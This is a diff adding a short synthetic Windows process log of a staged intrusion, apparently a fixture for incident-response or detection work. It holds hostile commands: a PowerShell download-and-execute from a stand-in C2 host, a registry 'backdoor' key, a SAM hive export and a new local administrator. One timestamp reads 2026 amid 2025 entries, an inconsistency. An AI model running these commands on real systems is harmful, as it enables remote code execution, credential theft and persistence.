@@ -1,0 +1,14 @@
+# Process Execution Log - Suspicious Process Activity
+# Format: Timestamp | PID | PPID | Process Name | Command Line | User | Integrity Level
+
+2025-11-03 08:16:20 | 4521 | 1234 | payload.exe | C:\Users\jsmith\Downloads\payload.exe | jsmith | Medium
+2025-11-03 08:17:00 | 4522 | 4521 | powershell.exe | powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://c2-server.example/script.ps1')" | jsmith | Medium
+2025-11-03 08:17:30 | 4523 | 4521 | cmd.exe | cmd.exe /c "net use Z: \\192.168.1.105\C$ /user:administrator" | jsmith | High
+2025-11-03 08:18:15 | 4524 | 4521 | wmic.exe | wmic process where name="explorer.exe" delete | jsmith | High
+2025-11-03 08:19:00 | 4525 | 4521 | reg.exe | reg add HKLM\SYSTEM\CurrentControlSet\Services\backdoor /t REG_SZ /d C:\Windows\System32\svchost.exe /f | jsmith | High
+2026-11-03 08:20:00 | 4526 | 4521 | svchost.exe | C:\Windows\System32\svchost.exe -k netsvcs | SYSTEM | System
+2025-11-03 08:22:10 | 4527 | 4521 | cmd.exe | cmd.exe /c "whoami /priv" | jsmith | High
+2025-11-03 08:23:00 | 4528 | 4521 | reg.exe | reg export HKLM\SAM C:\temp\sam_backup.reg | jsmith | High
+2025-11-03 09:05:42 | 4529 | 4521 | powershell.exe | powershell.exe -Command "Invoke-WebRequest -Uri http://c2-server.example/command -OutFile C:\temp\command.txt" | jsmith | Medium
+2025-11-03 09:30:18 | 4530 | 4521 | cmd.exe | cmd.exe /c "net localgroup administrators payload_user /add" | jsmith | High
+
